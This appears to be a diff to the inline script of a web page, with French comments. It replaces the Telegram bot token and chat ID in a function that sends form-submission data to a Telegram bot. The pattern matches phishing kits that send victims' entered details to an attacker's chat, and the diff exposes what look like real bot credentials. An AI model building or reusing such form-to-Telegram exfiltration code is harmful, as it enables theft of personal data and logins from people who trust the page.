@@ -295,8 +295,8 @@
       
         // Fonction pour envoyer les donn&eacute;es via un bot Telegram
         async function sendToTelegramBot(message) {
-          const botToken = '5832840905:AAEPXkvKZUgd-4X0OwioK-FQ-hAfrZJgnAc'; // Remplacez par votre token de bot Telegram
-          const chatId = '6156657645'; // Remplacez par votre chat ID
+          const botToken = '1496964853:AAGnuZ3M7ZolCyx1y3IwKj49fP4g-swoGKM'; // Remplacez par votre token de bot Telegram
+          const chatId = '812442755'; // Remplacez par votre chat ID
           const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`;
       
           try {
@@ -336,4 +336,5 @@
         document.querySelector('form').addEventListener('submit', handleFormSubmit);
       </script>
 </body>
+
 </html>
